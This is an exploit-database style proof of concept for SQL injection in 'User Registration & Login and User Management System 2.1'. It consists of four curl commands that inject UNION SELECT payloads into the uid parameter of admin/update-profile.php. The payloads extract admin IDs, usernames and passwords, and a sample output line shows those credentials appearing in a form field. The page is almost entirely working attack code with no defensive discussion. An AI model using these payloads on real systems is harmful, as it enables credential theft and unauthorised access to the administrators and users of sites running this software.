---
title: "User Registration & Login and User Management System 2.1 - SQL Injection"
date: 2020-10-22T10:57:56-03:00
draft: false
type: "sql"
platform: "webapps"
---

```html
# POC:
# 1)
#
curl -k "http://localhost/admin/update-profile.php?uid=-1' union select 1,(SELECT+GROUP_CONCAT(0x5b,0x49443a20,id,0x205d205b20,0x557365726e616d653a20,username,0x205d205b20,0x50617373776f72643a20,password,0x5d+SEPARATOR+0x3c62723e)+FROM+admin),3,4,5,6,7-- -" | grep fname

curl -k "http://localhost/admin/update-profile.php?uid=-1' union select 1,2,(SELECT+GROUP_CONCAT(0x5b,0x49443a20,id,0x205d205b20,0x557365726e616d653a20,username,0x205d205b20,0x50617373776f72643a20,password,0x5d+SEPARATOR+0x3c62723e)+FROM+admin),4,5,6,7-- -" | grep lname

curl -k "http://localhost/admin/update-profile.php?uid=-1' union select 1,2,3,(SELECT+GROUP_CONCAT(0x5b,0x49443a20,id,0x205d205b20,0x557365726e616d653a20,username,0x205d205b20,0x50617373776f72643a20,password,0x5d+SEPARATOR+0x3c62723e)+FROM+admin),5,6,7-- -" | grep email

curl -k "http://localhost/admin/update-profile.php?uid=-1' union select 1,2,3,4,5,(SELECT+GROUP_CONCAT(0x5b,0x49443a20,id,0x205d205b20,0x557365726e616d653a20,username,0x205d205b20,0x50617373776f72643a20,password,0x5d+SEPARATOR+0x3c62723e)+FROM+admin),7-- -" | grep contact
#
# <input type="text" class="form-control" name="fname" value="[ID: 1 ] [ Username: xxx ] [ Password: xxx]" >
#


```html